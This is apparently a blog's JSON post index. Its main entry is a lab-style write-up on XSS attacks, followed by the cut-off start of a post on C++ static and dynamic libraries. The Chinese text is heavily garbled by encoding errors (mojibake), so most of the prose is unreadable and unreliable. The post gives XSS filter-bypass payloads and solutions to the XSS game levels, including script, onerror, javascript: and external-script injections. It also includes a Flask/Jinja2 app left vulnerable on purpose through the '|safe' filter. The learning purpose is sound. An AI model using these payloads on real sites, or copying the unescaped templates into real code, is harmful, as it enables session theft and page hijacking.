è½½ç»™é¡µé¢ï¼Œå³è¯„è®ºåŒºçš„è„šæœ¬æ—¶ï¼Œå°†è‡ªèº«çš„cookieä»¥getæ–¹å¼å‘ç»™æ”»å‡»è€…çš„ç½‘ç«™(4)ï¼Œæ­¤æ—¶æ”»å‡»è€…å°±è·å¾—äº†ç”¨æˆ·çš„cookie\n  åå°„å‹ XSS å’Œå­˜å‚¨å‹ XSS çš„åŒºåˆ«æ˜¯ï¼šå­˜å‚¨å‹ XSS çš„æ¶æ„ä»£ç å­˜åœ¨æ•°æ®åº“é‡Œï¼Œåå°„å‹ XSS çš„æ¶æ„ä»£ç å­˜åœ¨ URL é‡Œã€‚\n  DOM å‹ XSS   DOM å‹ XSS çš„æ”»å‡»æ­¥éª¤ï¼š\n æ”»å‡»è€…æ„é€ å‡ºç‰¹æ®Šçš„ URLï¼Œå…¶ä¸­åŒ…å«æ¶æ„ä»£ç ã€‚ ç”¨æˆ·æ‰“å¼€å¸¦æœ‰æ¶æ„ä»£ç çš„ URLã€‚ ç”¨æˆ·æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”åè§£ææ‰§è¡Œï¼Œå‰ç«¯ JavaScript å–å‡º URL ä¸­çš„æ¶æ„ä»£ç å¹¶æ‰§è¡Œã€‚ æ¶æ„ä»£ç çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–è€…å†’å……ç”¨æˆ·çš„è¡Œä¸ºï¼Œè°ƒç”¨ç›®æ ‡ç½‘ç«™æ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œã€‚  DOM å‹ XSS è·Ÿå‰ä¸¤ç§ XSS çš„åŒºåˆ«ï¼šDOM å‹ XSS æ”»å‡»ä¸­ï¼Œå–å‡ºå’Œæ‰§è¡Œæ¶æ„ä»£ç ç”±æµè§ˆå™¨ç«¯å®Œæˆï¼Œå±äºå‰ç«¯ JavaScript è‡ªèº«çš„å®‰å…¨æ¼æ´ï¼Œè€Œå…¶ä»–ä¸¤ç§ XSS éƒ½å±äºæœåŠ¡ç«¯çš„å®‰å…¨æ¼æ´ã€‚\nXSSçš„å±å®³ å…¶å®å½’æ ¹ç»“åº•ï¼ŒXSSçš„æ”»å‡»æ–¹å¼å°±æ˜¯æƒ³åŠæ³•â€œæ•™å”†â€ç”¨æˆ·çš„æµè§ˆå™¨å»æ‰§è¡Œä¸€äº›è¿™ä¸ªç½‘é¡µä¸­åŸæœ¬ä¸å­˜åœ¨çš„å‰ç«¯ä»£ç ã€‚\nå¯é—®é¢˜åœ¨äºå°½ç®¡ä¸€ä¸ªä¿¡æ¯æ¡†çªç„¶å¼¹å‡ºæ¥å¹¶ä¸æ€ä¹ˆå‹å¥½ï¼Œä½†ä¹Ÿä¸è‡³äºä¼šé€ æˆä»€ä¹ˆçœŸå®ä¼¤å®³å•Šã€‚çš„ç¡®å¦‚æ­¤ï¼Œä½†è¦è¯´æ˜çš„æ˜¯ï¼Œè¿™é‡Œæ‹¿ä¿¡æ¯æ¡†è¯´äº‹ä»…ä»…æ˜¯ä¸ºäº†ä¸¾ä¸ªæ —å­ï¼ŒçœŸæ­£çš„é»‘å®¢æ”»å‡»åœ¨XSSä¸­é™¤éæ¶ä½œå‰§ï¼Œä¸ç„¶æ˜¯ä¸ä¼šåœ¨æ¶æ„æ¤å…¥ä»£ç ä¸­å†™ä¸Šalertï¼ˆâ€œsay somethingâ€ï¼‰çš„ã€‚\nåœ¨çœŸæ­£çš„åº”ç”¨ä¸­ï¼ŒXSSæ”»å‡»å¯ä»¥å¹²çš„äº‹æƒ…è¿˜æœ‰å¾ˆå¤šï¼Œè¿™é‡Œä¸¾ä¸¤ä¸ªä¾‹å­ã€‚\n  çªƒå–ç½‘é¡µæµè§ˆä¸­çš„cookieå€¼   åœ¨ç½‘é¡µæµè§ˆä¸­æˆ‘ä»¬å¸¸å¸¸æ¶‰åŠåˆ°ç”¨æˆ·ç™»å½•ï¼Œç™»å½•å®Œæ¯•ä¹‹åæœåŠ¡ç«¯ä¼šè¿”å›ä¸€ä¸ªcookieå€¼ã€‚è¿™ä¸ªcookieå€¼ç›¸å½“äºä¸€ä¸ªä»¤ç‰Œï¼Œæ‹¿ç€è¿™å¼ ä»¤ç‰Œå°±ç­‰åŒäºè¯æ˜äº†ä½ æ˜¯æŸä¸ªç”¨æˆ·ã€‚\nå¦‚æœä½ çš„cookieå€¼è¢«çªƒå–ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¾ˆå¯èƒ½èƒ½å¤Ÿç›´æ¥åˆ©ç”¨ä½ çš„è¿™å¼ ä»¤ç‰Œä¸ç”¨å¯†ç å°±ç™»å½•ä½ çš„è´¦æˆ·ã€‚å¦‚æœæƒ³è¦é€šè¿‡scriptè„šæœ¬è·å¾—å½“å‰é¡µé¢çš„cookieå€¼ï¼Œé€šå¸¸ä¼šç”¨åˆ°document.cookieã€‚\nè¯•æƒ³ä¸‹å¦‚æœåƒç©ºé—´è¯´è¯´ä¸­èƒ½å¤Ÿå†™å…¥xssæ”»å‡»è¯­å¥ï¼Œé‚£å²‚ä¸æ˜¯çœ‹äº†ä½ è¯´è¯´çš„äººçš„å·ä½ éƒ½å¯ä»¥ç™»å½•ï¼ˆä¸è¿‡æŸäº›å‚å•†çš„cookieæœ‰å…¶ä»–éªŒè¯æªæ–½å¦‚ï¼šHttp-Onlyä¿è¯åŒä¸€cookieä¸èƒ½è¢«æ»¥ç”¨ï¼‰\n  åŠ«æŒæµé‡å®ç°æ¶æ„è·³è½¬   è¿™ä¸ªå¾ˆç®€å•ï¼Œå°±æ˜¯åœ¨ç½‘é¡µä¸­æƒ³åŠæ³•æ’å…¥ä¸€å¥åƒè¿™æ ·çš„è¯­å¥ï¼š\n1  \u003cscript\u003ewindow.location.href=\"http://www.baidu.com\";\u003c/script\u003e   é‚£ä¹ˆæ‰€è®¿é—®çš„ç½‘ç«™å°±ä¼šè¢«è·³è½¬åˆ°ç™¾åº¦çš„é¦–é¡µã€‚\næ—©åœ¨2011å¹´æ–°æµªå°±æ›¾çˆ†å‡ºè¿‡ä¸¥é‡çš„xssæ¼æ´ï¼Œå¯¼è‡´å¤§é‡ç”¨æˆ·è‡ªåŠ¨å…³æ³¨æŸä¸ªå¾®åšå·å¹¶è‡ªåŠ¨è½¬å‘æŸæ¡å¾®åšã€‚å…·ä½“å„ä½å¯ä»¥è‡ªè¡Œç™¾åº¦ã€‚\nXSSæ¼æ´é˜²èŒƒ  è¿‡æ»¤ æœåŠ¡å™¨å¯¹è¾“å…¥å†…å®¹è¿›è¡Œè¿‡æ»¤ï¼Œå¯¹ä¸€äº›å¸¸ç”¨çš„æ ‡ç­¾(\u003cscript\u003eã€\u003cimg\u003eã€\u003ca\u003e)è¿›è¡Œè¿‡æ»¤ï¼Œä¹Ÿæœ‰å¯èƒ½éœ€è¦å¤šæ¬¡è¿‡æ»¤ä»¥é˜²ç»•è¿‡ è¾“å…¥è¾“å‡ºç¼–ç  æœåŠ¡å™¨å¯¹è¾“å…¥å†…å®¹çš„ä¸€äº›å¸¸è§ç¬¦å·è¿›è¡Œç¼–ç ï¼Œä½¿å¾—æµè§ˆå™¨ä¸ä¼šå¯¹æ ‡ç­¾è¿›è¡Œè§£é‡Šæ‰§è¡Œ å¯¹å†…å®¹é•¿åº¦è¿›è¡Œé™åˆ¶ å¯¹äºæ³¨å…¥å†…å®¹ä¸€èˆ¬æ¯”è¾ƒé•¿çš„è¿›è¡Œé•¿åº¦é™åˆ¶ï¼Œå› ä¸ºè¾¾æˆXSSæ”»å‡»ä¸€èˆ¬éœ€è¦è¾ƒé•¿çš„å­—ç¬¦ä¸²ï¼Œæ¯”å¦‚è¾“å…¥åå­—çš„æ—¶å€™ï¼Œæˆ‘ä»¬æ²¡å¿…è¦å¼€è¿‡é•¿çš„æ•°ç»„  ä½œä¸ºç”¨æˆ·ï¼Œæˆ‘ä»¬éœ€è¦å°å¿ƒç‚¹å‡»æ¥æºä¸æ˜çš„URLï¼Œå¯¹æµè§ˆå™¨è¿›è¡Œå®‰å…¨åŠ å›ºï¼Œè™½ç„¶å¤§å¤šå·®é”™æ˜¯æ¥æºäºæœåŠ¡å™¨ç«¯çš„æ£€æŸ¥è¿‡æ»¤ä¸è¶³å¯¼è‡´çš„ï¼Œä½†åæœå´æ˜¯å¯¼è‡´æˆ‘ä»¬çš„ä¿¡æ¯ä¸¢å¤±ï¼Œå› æ­¤ä½œä¸ºç”¨æˆ·æˆ‘ä»¬ä¹Ÿåº”å½“åŠ ä»¥é˜²èŒƒã€‚\nXSSé˜²èŒƒä¸ç»•è¿‡ å®‰å…¨æ€»æ˜¯åœ¨å¯¹æŠ—ä¸­äº§ç”Ÿçš„ï¼Œå‡å¦‚æ²¡æœ‰æ”»å‡»ï¼Œé‚£ä¹ˆå“ªæ¥çš„é˜²èŒƒæå‡å‘¢ï¼Ÿæ­£å¦‚è€è¯ï¼šé­”é«˜ä¸€å°ºï¼Œé“é«˜ä¸€ä¸ˆã€‚åªæœ‰åœ¨ä¸æ–­åœ°æ”»å‡»ä¸­ï¼Œå®‰å…¨æ‰èƒ½æ›´èƒœä¸€æ­¥ã€‚\næ—¢ç„¶XSSè¢«å‘ç°ï¼Œå°±ä¼šæœ‰äººå¯¹ä»–è¿›è¡Œé˜²èŒƒï¼Œæ—¢ç„¶æœ‰äº†é˜²èŒƒï¼Œé‚£ä¹ˆå°±ä¼šæœ‰äººå»æƒ³æ–¹è®¾æ³•çš„å»ç»•è¿‡ä»–\nè¿™é‡Œä»‹ç»ä¸€äº›ç»å…¸çš„ç»•è¿‡æ–¹å¼\n å¤§å°å†™ç»•è¿‡ åˆ©ç”¨è¿‡æ»¤åè¿”å›è¯­å¥åœ¨æ­¤æ„æˆæ”»å‡»è¯­å¥æ¥ç»•è¿‡ï¼ˆç®€ç§°å¥—å¨ƒï¼‰ æ¯”å¦‚ï¼šhttp://192.168.1.102/xss/example3.php?name=\u003csCri\u003cscript\u003ept\u003ealert(\"hey!\")\u003c/scRi\u003c/script\u003ept\u003e å¹¶ä¸æ˜¯åªæœ‰scriptæ ‡ç­¾æ‰å¯ä»¥æ’å…¥ä»£ç ï¼Œæ¯”å¦‚\u003ca\u003eã€\u003cimg\u003eã€\u003cdiv\u003eç­‰ç­‰ ç¼–ç è„šæœ¬ä»£ç ç»•è¿‡å…³é”®å­—è¿‡æ»¤ ä¸»åŠ¨é—­åˆæ ‡ç­¾å®ç°æ³¨å…¥ä»£ç  ç»„åˆå„ç§æ–¹å¼ï¼šå°±å¦‚åŒsqlæ³¨å…¥ä¸€æ ·ï¼ŒXSSéœ€è¦ç”¨å¿ƒå»æ„é€ 0.0  XSSé¶åœºé€šå…³æ„é€   https://blog.csdn.net/abc_12366/article/details/82054946\n 1\nè¾“å…¥æ¡†æäº‹æƒ…äº†\n\u003cscript\u003ealert('hello,XSS!')\u003c/script\u003e\n2\nè¯„è®ºåŒºæäº‹æƒ…äº†\n\u003cimg src=\"nowhere\" onerror='alert(\"madness\")'\u003e\n3\nåœ¨urlæäº‹æƒ…ï¼Œè¿™è¾¹æˆ‘è‡ªå·±æ²¡æ³¨æ„ï¼Œå®ƒä½¿ç”¨â€œâ€è¡¨ç¤ºå­—ç¬¦ä¸²ï¼Œ''è¡¨ç¤ºæ ‡ç­¾é‡Œçš„å­—ç¬¦ä¸²ï¼Œæ²¡æ³¨æ„åˆ°å¡äº†ä¸€ä¼šå„¿\nhttps://xss-game.appspot.com/level3/frame#1'/\u003e\u003cscript\u003ealert('Hello,XSS!');\u003c/script\u003e'\n4\nç±»ä¼¼äºä¸€ä¸ªè®¡æ—¶å™¨ï¼Œä½†ä¸è¿‡æ ¹æ®æè¿°éœ€è¦ç»•è¿‡ï¼Œå½“ç„¶ä¹Ÿå°±æ˜¯åœ¨è¾“å…¥æ¡†æäº‹æƒ…äº†\njsåŠ¨æ€å¼•ç”¨å‚æ•°é—®é¢˜\nè¾“å…¥3'å¯ä»¥çœ‹åˆ° onload=\"startTime('3'');\"\nå°è¯•è¾“å…¥3');alert('hello,XSS!\n5\nè¿™ä¸ªå¯å¤ªåˆºæ¿€äº†ï¼Œæˆ‘ç«Ÿç„¶æ²¡å‘ç°èƒ½çœ‹æºä»£ç ï¼Œäºæˆ‘æŒ‰F12çœ‹ä»£ç ï¼Œåœ¨Næ¬¡å°è¯•ä¸‹çŒœå®ç°\nè¾“å…¥è½¬ä¸ºé“¾æ¥è¿‡æ»¤ä¸ä¸¥\nçœ‹æºä»£ç æŒ‰ä¸‹é¢çš„toggle\næ„é€ å¦‚ä¸‹ï¼šhttps://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)\n6\nå¼•å…¥å¤–éƒ¨jsï¼Œè¿‡æ»¤ä¸ä¸¥å¯¼è‡´ç»•è¿‡é€ æˆxss\n#åé¢èƒ½è®¿é—®åˆ°urlæ‰€æŒ‡çš„åœ°æ–¹ï¼Œæ¯”å¦‚å°†å…¶æ›¿æ¢ä¸ºbaidu.com\næ‰€ä»¥è¿™è¾¹å†™ä¸ªç®€æ˜“çš„javascriptè„šæœ¬\n1  alert(1);   ç„¶åä¿å­˜\nç”¨æˆ‘ä»¬python3è‡ªå¸¦çš„ç®€æ˜“æœåŠ¡å™¨ç”¨äºå…¶urlè®¿é—®\n1  $ python -m http.server 8000   ç„¶åè®¿é—®æœ¬åœ°8000ç«¯å£å°±å¯ä»¥çœ‹åˆ°æœ¬åœ°æ–‡ä»¶äº†\nç„¶åæ„é€ urlï¼šhttps://xss-game.appspot.com/level6/frame#HTTP://127.0.0.1:8000/temp.js\næ³¨æ„ï¼Œé¢˜ç›®jsæºç ä¸­æœ‰å¯¹httpçš„è¿‡æ»¤\nå½“ç„¶ä¹Ÿå¯ä»¥ç”¨googleçš„jsapiï¼šhttps://xss-game.appspot.com/level6/frame#hTTps://google.com/jsapi?callback=alert\né€šå…³æ’’èŠ±\næœ€åé€šå‘äº†å…¶XSSå­¦ä¹ ç½‘ç«™ï¼šhttps://www.google.com/about/appsecurity/learning/xss/index.html\næ„é€ ä¸€ä¸ªXSSç½‘ç«™ä»¥åŠå…¶å¯¹æŠ— é€šè¿‡ä¸Šé¢çš„é¶åœºç»ƒä¹ å·²ç»å¾ˆç†Ÿæ‚‰XSSçš„åŸç†äº†\nåˆšå¼€å§‹å†ç”¨flaskåŸºæœ¬å®ç°ä¸€ä¸ªæœç´¢åŠŸèƒ½æ—¶ï¼Œå‘ç°æ— æ³•XSSï¼Œåé¢ç»æŸ¥è¯¢Flaskå’Œjinja2éƒ½æœ‰åœ¨ä¼ è¾“æ—¶å¯¹æ•°æ®è¿›è¡Œhtmlè½¬ä¹‰ï¼Œä½†é»˜è®¤æ˜¯Flaskå…³é—­htmlè½¬ä¹‰ï¼Œjinja2å¼€å¯htmlè½¬ä¹‰\n flaskå’Œå…¶æ¨¡æ¿jinja2 ç¦ç”¨htmlè½¬ä¹‰\nhttps://blog.csdn.net/super_tiger_lee/article/details/77837443\nhttps://www.jianshu.com/p/6950b616f2b7\nç®€å•æ¥è¯´ï¼Œåœ¨ä½¿ç”¨å˜é‡ {{var}} åˆ©ç”¨jinjaç®¡é“çš„æ–¹æ³•ï¼Œå¯¹ var å˜é‡è¿›è¡Œä¿¡ä»»ï¼Œè€Œä¸è¿›è¡Œhtmlè½¬ä¹‰ï¼Œå³å†™ä¸º {{ var | safe }}\n åœ¨å‰åå°ä¼ è¾“æ•°æ®é‡åˆ°çš„é—®é¢˜ï¼š\n å¤ªä¹…æ²¡å†™flaskæœ‰ç‚¹ç”Ÿç–ï¼Œç„¶åå¯¼è‡´è¡¨å•è·å–è¯·æ±‚æ—¶ä¸€ç›´ä¸ºç©ºï¼Œå¿˜è®°å•¥åŸå› äº†ï¼Œè¿™è¾¹markä¸€ä¸‹\ngetè¯·æ±‚è¡¨å•é€šè¿‡request.args.get('name')è·å¾—\npostè¯·æ±‚è¡¨å•é€šè¿‡request.form.get('name')è·å¾—\n  åœ¨è¯„è®ºæ—¶ï¼Œé˜²æ­¢getè¯·æ±‚åˆ·æ–°åé‡å¤è¯„è®ºï¼Œéœ€è¦ç”¨postå»è¯·æ±‚è¯„è®º  å®ç°htmlè½¬ä¹‰ï¼Œæœ‰htmlåŒ…æä¾›çš„æ–¹æ³•ï¼Œä½†ä»£ç é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä»¿é€ å…¶å†™ä¸€ä¸ª(å…¶å®å¾ˆç®€å•)\n1 2 3 4  import html s = \"\u003cscript\u003ealert(1);\u003c/script\u003e\" tran_s = html.escape(s) ret = html.unescape(tran_s)   ä¸‹é¢ç»™å‡ºä»£ç \nå‰ç«¯éƒ¨åˆ†\nä¸»è¦ç”¨jinja2æ¨¡æ¿å†™çš„\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119  \u003c!DOCTYPE html\u003e \u003chtml\u003e\u003chead\u003e\u003cmeta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"\u003e \u003ctitle\u003efuckXSS\u003c/title\u003e \u003cstyle type='text/css'\u003e div { display: block; } table { border-collapse: separate; border-spacing: 2px; } .message-container { padding: 10px; background-color: #F9F9F9; border: 1px solid #C4C4C4; border-radius: 5px 5px; width: 400px; font-size: 12px; } td { display: table-cell; vertical-align: inherit; } .shim { position: absolute; margin-left: -20px; top: 15px; height: 21px; width: 10px; } b { font-weight: bold; } blockquote { display: block; margin-block-start: 1em; margin-block-end: 1em; margin-inline-start: 40px; margin-inline-end: 40px; } \u003c/style\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1 style='text-align: center'\u003e åå°„æ€§XSS \u003c/h1\u003e \u003cdiv style='text-align: center; margin: 0 auto;'\u003e {% if query %} \u003cform action=\"/rxss\" method=\"GET\"\u003e \u003cinput type=\"text\" id=\"query\" name=\"query\" value=\"{{query}}\"\u003e \u003cbr\u003e anti-XSS\u003cinput type=\"checkbox\" name=\"anti-XSS\" value=\"1\"/\u003e \u003cbr\u003e \u003cinput id=\"button\" type=\"submit\" value=\"Search\"\u003e \u003c/form\u003e \u003cbr\u003eYour Search for {{ query|safe }}\u003cbr\u003e Unfortunately it has gone!\u003cbr\u003e {% else %} \u003cform action=\"/rxss\" method=\"GET\"\u003e \u003cinput type=\"text\" id=\"query\" name=\"query\" value=\"Enter query here...\"\u003e \u003cbr\u003e anti-XSS\u003cinput type=\"checkbox\" name=\"anti-XSS\" value=\"1\"/\u003e \u003cbr\u003e \u003cinput id=\"button\" type=\"submit\" value=\"Search\"\u003e \u003c/form\u003e {% endif %} \u003c/div\u003e \u003ch1 style='text-align: center'\u003e æŒä¹…æ€§XSS \u003c/h1\u003e \u003cdiv style='text-align: center; margin: 0 auto;'\u003e \u003cform name=\"pxss\" action=\"pxss\" method=\"POST\"\u003e \u003cinput id=\"qcomment\" name=\"qcomment\" value=\"Enter comment here...\" onfocus=\"this.value=\u0026#39;\u0026#39;\"\u003e \u003cbr\u003e anti-XSS\u003cinput type=\"checkbox\" name=\"anti-XSS\" value=\"1\"/\u003e \u003cbr\u003e \u003cinput id=\"button\" type=\"submit\" value=\"Comment\"\u003e \u003c/form\u003e \u003c/div\u003e \u003cbr\u003e\u003cbr\u003e \u003cdiv id=\"post-container\" align=\"center\"\u003e \u003ctable class=\"message\"\u003e \u003ctbody\u003e\u003ctr\u003e \u003ctd valign=\"top\" class=\"message-container\"\u003e \u003cdiv class=\"shim\"\u003e\u003c/div\u003e \u003cb\u003eYou\u003c/b\u003e\u003cbr\u003e \u003cspan class=\"date\"\u003eSun Apr 12 2020 16:44:32 GMT+0800 (ä¸­å›½æ ‡å‡†æ—¶é—´)\u003c/span\u003e \u003cblockquote\u003eWelcome!\u003cbr\u003e\u003cbr\u003eThis is your \u003ci\u003epersonal\u003c/i\u003e stream. You can post anything you want here, especially \u003cspan style=\"color: #f00ba7\"\u003emadness\u003c/span\u003e.\u003c/blockquote\u003e \u003c/td\u003e\u003c/tr\u003e {% if comment %} {% for comment_item in comment %} \u003ctr\u003e \u003ctd valign=\"top\" class=\"message-container\"\u003e \u003cdiv class=\"shim\"\u003e\u003c/div\u003e \u003cb\u003eYou\u003c/b\u003e\u003cbr\u003e \u003cblockquote\u003e\u003cp\u003e{{comment_item | safe}}\u003c/p\u003e\u003c/blockquote\u003e \u003c/td\u003e\u003c/tr\u003e {% endfor %} {% endif %} \u003c/tbody\u003e \u003c/table\u003e \u003c/div\u003e \u003c/body\u003e\u003c/html\u003e   åç«¯éƒ¨åˆ†ï¼š\né€šè¿‡Pythonçš„Flaskå®ç°\né€šè¿‡è·¯ç”±æ¥æ¥æ”¶æœç´¢å’Œè¯„è®ºè¯·æ±‚ï¼ŒæŠŠè¯„è®ºå†…å®¹å­˜å‚¨åœ¨ä¸€ä¸ªæ•°ç»„é‡Œï¼ˆæ¯•ç«Ÿæ˜¯ä¸´æ—¶çš„ï¼Œé‡å¯Flaskåº”ç”¨å³å¯æ¸…é™¤è¯„è®ºï¼‰\nXSSçš„å¯¹æŠ—å°†è¾“å…¥è¿›è¡Œhtmlç¼–ç å®ç°ï¼Œå‹¾é€‰æ¡†å³å¯å¯ç”¨\nescapeä»¿ç…§äº†HTMLåŒ…é‡Œé¢å¯¹äºhtmlç¼–ç çš„å®ç°ï¼Œåˆ©ç”¨pythonçš„å­—ç¬¦ä¸²æ›¿ä»£ç›´æ¥æ›¿æ¢ç›¸å…³çš„htmlç¬¦å·ï¼Œå®ç°htmlç¼–ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75  # !/usr/bin/env python # -*- coding: utf-8 -*- # # @time\t: 2020/04/12 # @Author\t:\tMagic # @File\t:\txss_test_server.py from flask import Flask,render_template,request,redirect,url_for app = Flask(__name__) comment = [] @app.route('/', methods=[\"GET\",\"POST\"]) def index(): return render_template(\"XSS.html\", comment=comment, query=None) # Realize the Reflected XSS attack Vulnerable Search box @app.route('/rxss', methods=[\"GET\",\"POST\"]) def rxss(): if request.method == \"GET\": qdata = request.args.get('query') action = request.args.get('anti-XSS') if not action: action = 0 print(request.args) if int(action): qdata = escape(qdata) print(qdata) return render_template(\"XSS.html\", query=qdata) # Realize the Persistent XSS attack Vulnerable Comment @app.route('/pxss', methods=[\"GET\",\"POST\"]) def pxss(): if request.method == \"POST\": qcomment = request.form.get('qcomment') action = request.form.get('anti-XSS') global comment if not action: action = 0 print(request.form) if int(action): qcomment = escape(qcomment) comment.append(qcomment) print(comment) #return render_template(\"XSS.html\", comment=comment) return redirect(url_for('index')) # æ£€æŸ¥å­—ç¬¦ä¸²æ˜¯å¦å«æœ‰æ ‡ç­¾å¹¶ç¼–ç  def escape(s, quote=True): \"\"\" Replace special characters \"\u0026\", \"\u003c\" and \"\u003e\" to HTML-safe sequences. If the optional flag quote is true (the default), the quotation mark characters, both double quote (\") and single quote (') characters are also translated. \"\"\" s = s.replace(\"\u0026\", \"\u0026amp;\") # Must be done first! s = s.replace(\"\u003c\", \"\u0026lt;\") s = s.replace(\"\u003e\", \"\u0026gt;\") if quote: s = s.replace('\"', \"\u0026quot;\") s = s.replace('\\'', \"\u0026#x27;\") return s if __name__ == '__main__': app.run(debug=True, port=12345)   ","description":"","tags":["web","ctf"],"title":"XSS Attack","uri":"/posts/xss-attack/"},{"categories":["c++"],"content":"0x00 åº  https://www.runoob.com/w3cnote/cpp-static-library-and-dynamic-library.html\nhttps://zhuanlan.zhihu.com/p/32615811\nhttps://www.cnblogs.com/WindSun/p/11287927.html\n åœ¨å†™å…³äºç—…æ¯’ç¨‹åºä¹‹å‰ï¼Œå¿½ç„¶æƒ³å­¦ä¹ ä¸€ä¸‹æœ‰å…³C++åº“æ–‡ä»¶çš„ç¼–å†™\nåº“ï¼Œæ˜¯å¯å¤ç”¨ä»£ç çš„é›†åˆ\næ€»æ‰€å‘¨çŸ¥ï¼Œåº“æ–‡ä»¶åˆ†ä¸ºé™æ€é“¾æ¥åº“å’ŒåŠ¨æ€é“¾æ¥åº“ï¼Œä¸¤è€…æœ‰ä¸€å®šçš„åŒºåˆ«\né™æ€é“¾æ¥åº“åœ¨ç¼–è¯‘æ—¶ï¼Œå°±é€šè¿‡é“¾æ¥æˆä¸ºå¯æ‰§è¡Œæ–‡ä»¶çš„ä¸€éƒ¨åˆ†ï¼Œç®€å•æ¥è¯´ï¼Œå°±æ˜¯å°†åº“å‡½æ•°èå…¥ç›®æ ‡ç¨‹åºå†…ï¼Œå³ä½¿ç›®æ ‡ç¨‹åºæ²¡æœ‰å’Œåº“æ–‡ä»¶åœ¨ä¸€èµ·ä¹Ÿèƒ½è¿è¡Œï¼›è€ŒåŠ¨æ€é“¾æ¥åº“æ˜¯åœ¨ç¨‹åºè¿è¡Œæ—¶è°ƒç”¨çš„ï¼Œå…¶åº“å¹¶æ²¡æœ‰èå…¥ç›®æ ‡ç¨‹åºå†…ï¼Œè¿è¡Œæ—¶å¯ä»¥éšæ„åŠ è½½å’Œç§»é™¤ï¼ŒèŠ‚çœå†…å­˜ç©ºé—´ã€‚\nåŠ¨æ€é“¾æ¥åº“å’Œé™æ€é“¾æ¥åº“çš„ç›¸åŒç‚¹æ˜¯å®ƒä»¬éƒ½å®ç°äº†ä»£ç çš„å…±äº«ï¼Œä¸åŒç‚¹æ˜¯é™æ€é“¾æ¥åº“æ–‡ä»¶ä¸­çš„ä»£ç è¢«åŒ…å«ç›®æ ‡ç¨‹åºä¸­ï¼Œè¯¥libä¸­ä¸èƒ½å†åŒ…å«å…¶ä»–åŠ¨æ€é“¾æ¥æˆ–è€…é™æ€é“¾æ¥çš„åº“äº†ã€‚è€ŒåŠ¨æ€é“¾æ¥åº“å¯ä»¥è¢«è°ƒç”¨çš„ç›®æ ‡ç¨‹åºåŠ¨æ€åœ°â€œå¼•ç”¨â€å’Œâ€œå¸è½½â€ï¼Œä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ä¸­å¯ä»¥åŒ…å«å…¶ä»–åŠ¨æ€é“¾æ¥åº“æˆ–è€…é™æ€é“¾æ¥åº“ã€‚åœ¨å¤§å‹çš„è½¯ä»¶é¡¹ç›®ä¸­ä¸€èˆ¬è¦å®ç°å¾ˆå¤šåŠŸèƒ½ï¼Œå¦‚æœæŠŠæ‰€æœ‰å•ç‹¬çš„åŠŸèƒ½å†™æˆä¸€ä¸ªä¸ªlibæ–‡ä»¶çš„è¯ï¼Œç¨‹åºè¿è¡Œçš„æ—¶å€™è¦å ç”¨å¾ˆå¤§çš„å†…å­˜ç©ºé—´ï¼Œå¯¼è‡´è¿è¡Œç¼“æ…¢ï¼›ä½†æ˜¯å¦‚æœå°†åŠŸèƒ½å†™æˆdllæ–‡ä»¶ï¼Œå°±å¯ä»¥åœ¨ç”¨åˆ°è¯¥åŠŸèƒ½çš„æ—¶å€™è°ƒç”¨åŠŸèƒ½å¯¹åº”çš„dllæ–‡ä»¶ï¼Œä¸ç”¨è¿™ä¸ªåŠŸèƒ½æ—¶å°†dllæ–‡ä»¶ç§»é™¤å†…å­˜ï¼Œè¿™æ ·å¯ä»¥èŠ‚çœå†…å­˜ç©ºé—´ã€‚\n åœ¨Winä¸‹ï¼ŒåŠ¨æ€åº“ä»¥.dllç»“å°¾ï¼Œé™æ€åº“ä»¥.libç»“å°¾ã€‚ åœ¨Linuxä¸‹ï¼ŒåŠ¨æ€åº“æ–‡ä»¶ä»¥.soç»“å°¾ï¼Œé™æ€åº“ä»¥.aç»“å°¾ã€‚ åœ¨Macä¸‹ï¼ŒåŠ¨æ€åº“ä»¥.dylibç»“å°¾ï¼Œé™æ€åº“ä»¥.aç»“å°¾ã€‚  Windows é™æ€åº“(.lib) libTest.h\n1 2 3 4  #ifndef _TEST_H #define _TEST_H int test_add(int x, int y); #endif   libTest.cpp\n1 2 3 4 5 6 7 8 9  #include \"libTest.h\"#include \u003ciostream\u003e//using namespace std;  int test_add(int x, int y){ int sum; sum = x + y; return sum; }   ç„¶åwindowsä¸‹éœ€è¦é…åˆVSå‘½ä»¤è¡Œ(æˆ‘æ²¡å†…å­˜å¸äº†XD)ï¼Œæˆ–è€…vs studioé‡Œé¢å¯ä»¥ç›´æ¥ç”Ÿæˆ\nä½¿ç”¨é™æ€åº“ä¹Ÿå¯åœ¨é‡Œé¢é…ç½®\nä½¿ç”¨ main.cpp\n1 2 3 4 5 6 7 8 9 10 11 12  #include \"libTest.h\"#include \u003ciostream\u003eusing namespace std; #pragma comment(lib,\"libTest.lib\") //åŠ å…¥é“¾æ¥åº“  void main(){ int sum; sum = test_add(1, 2); cout \u003c\u003c sum \u003c\u003c endl; system(\"pause\"); }   åŠ¨æ€åº“(.dll) dllGen.h\n1 2 3 4  #ifndef _MYADD_H #define _MYADD_H __declspec(dllexport) int test_add(int x, int y); #endif   